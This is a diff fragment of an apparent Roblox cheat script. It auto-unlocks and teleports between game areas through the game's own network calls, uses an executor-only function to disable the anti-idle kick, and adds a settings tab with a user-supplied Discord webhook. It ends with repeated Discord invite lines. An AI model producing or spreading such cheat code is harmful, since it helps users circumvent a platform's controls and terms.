+					elseif currentArea.world == "Fantasy" then
+						local interactive = map:FindFirstChild("Interactive")
+						local portals = nil
+						if interactive then portals = interactive:FindFirstChild("Portals") end
+						if portals and portals:FindFirstChild(nextAreaName) then 
+							local portal = portals:FindFirstChild(nextAreaName)
+							HumanoidRootPart.CFrame = CFrame.new(portal.PrimaryPart.CFrame.p) + (portal.PrimaryPart.CFrame.RightVector * 5)
+							successfullyTeleported = true
+						end 
+						
+					end
+					
+					if successfullyTeleported then
+						wait(0.1)
+						SendNotification("Unlocking ".. nextAreaName .. "...")
+						local success, errorMsg = Library.Network.Invoke("Buy Area", nextAreaName)
+						if success then
+							if currentAreaName == "Cat Kingdom" then
+								SendNotification("Unlocking Limbo...")
+								Library.WorldCmds.Load("Limbo")
+								wait(1)
+							end
+							-- TELEPORT TO THE NEW AREA
+							local areaTeleport = Library.WorldCmds.GetMap().Teleports:FindFirstChild(nextAreaName);
+							if areaTeleport then 
+								Library.Signal.Fire("Teleporting")
+								task.wait(0.25)
+								Character:PivotTo(areaTeleport.CFrame + areaTeleport.CFrame.UpVector * (Humanoid.HipHeight + HumanoidRootPart.Size.Y / 2))
+								Library.Network.Fire("Performed Teleport", nextAreaName)
+								task.wait(0.25)
+							end	
+						end
+					end
+					
+					wait(1)
+				else 
+					-- NOT AVAILABLE YET
+					-- Start farming? Teleport to area? Idk yet
+				end
+			end
+			
+			task.wait(0.5)
+		end
+	end)
+
+	
+	local settingsTab = Window:CreateTab("Settings", "13075268290", true)
+	local windowSettings = settingsTab:CreateSection("General Options", false, false, "13080063021")
+	
+	settingsTab:CreateToggle({
+		Name = "Compact Mode",
+		CurrentValue = false,
+		Flag = "Settings_CompactMode",
+		SectionParent = windowSettings,
+		Callback = function(value) 
+			Rayfield:ToggleOldTabStyle(not value)
+		end
+	})
+	
+	settingsTab:CreateToggle({
+		Name = "Disable Rendering when Alt-Tab",
+		CurrentValue = true,
+		Flag = "Settings_DisableRendering",
+		SectionParent = windowSettings,
+		Callback = function(value) 
+			Settings_DisableRendering = value
+		end
+	})
+	
+	local discordSettings = settingsTab:CreateSection("Webhook Options", false, true, "13085068876")
+	settingsTab:CreateToggle({
+		Name = "Enable Webhook",
+		CurrentValue = false,
+		Flag = "Webhook_Enabled",
+		SectionParent = discordSettings,
+		Callback = function(value) 
+			Webhook_Enabled = value
+		end
+	})
+
+	local WebhookURLInput = settingsTab:CreateInput({
+	   Name = "Webhook URL",
+	   PlaceholderText = "Paste your Discord Webhook here",
+	   SectionParent = discordSettings,
+	   NumbersOnly = false,
+	   OnEnter = false,
+	   RemoveTextAfterFocusLost = false,
+	   Callback = function(Text)
+			SaveCustomFlag("Webhook_URL", Text)
+	   end,
+	   
+	})	
+		
+	AddCustomFlag("Webhook_URL", "", function(newValue) 
+		Webhook_URL = newValue
+		if WebhookURLInput and newValue and newValue ~= "" then
+			WebhookURLInput:Set(newValue)
+		end
+	end)
+	
+	settingsTab:CreateToggle({
+		Name = "Daycare Updates",
+		CurrentValue = false,
+		Flag = "Webhook_Daycare",
+		SectionParent = discordSettings,
+		Callback = function(value) 
+			Webhook_Daycare = value
+		end
+	})
+	
+	-- TODO: Change this to a Dropdown with rarities to notify
+	settingsTab:CreateToggle({
+		Name = "Notify Huge Hatches",
+		CurrentValue = false,
+		Flag = "Webhook_Huge",
+		SectionParent = discordSettings,
+		Callback = function(value) 
+			Webhook_Huge = value
+		end
+	})
+	
+	Rayfield.LoadConfiguration()
+
+	for i,v in pairs(getconnections(game.Players.LocalPlayer.Idled)) do
+		v:Disable()
+	end
+
+	InputService.WindowFocused:Connect(function()
+		RunService:Set3dRenderingEnabled(true)
+	end)
+
+	InputService.WindowFocusReleased:Connect(function()
+		if Settings_DisableRendering then
+			RunService:Set3dRenderingEnabled(false)
+		end
+	end)
+end
+
+-- https://discord.gg/d2X3XVm7
+-- https://discord.gg/d2X3XVm7
+-- https://discord.gg/d2X3XVm7
+-- https://discord.gg/d2X3XVm7
+-- https://discord.gg/d2X3XVm7
+-- https://discord.gg/d2X3XVm7
+-- https://discord.gg/d2X3XVm7
+-- https://discord.gg/d2X3XVm7
+-- https://discord.gg/d2X3XVm7
